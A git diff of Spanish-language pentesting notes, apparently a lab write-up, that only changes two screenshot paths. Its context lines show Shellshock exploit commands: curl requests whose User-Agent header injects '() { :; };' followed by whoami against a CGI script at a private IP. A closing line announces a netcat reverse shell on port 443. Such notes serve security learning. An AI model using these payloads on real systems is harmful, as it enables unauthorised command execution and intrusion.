@@ -8,7 +8,7 @@ tags:
 curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
 ```
 
-![Pasted image 20251015152306](<../../.gitbook/assets/Pasted image 20251015152306.png>)
+![Pasted image 20251015152306](<../../../.gitbook/assets/Pasted image 20251015152306.png>)
 
 > NOTA: Si el servidor no arroja un resultado o da error, probar este otro:
 
@@ -16,7 +16,7 @@ curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; /
 curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
 ```
 
-![Pasted image 20251015152325](<../../.gitbook/assets/Pasted image 20251015152325.png>)
+![Pasted image 20251015152325](<../../../.gitbook/assets/Pasted image 20251015152325.png>)
 
 Ahora, nos enviamos una reverse shell a nuestra máquina de atacante utilizando netcat en escucha por el puerto 443:
 
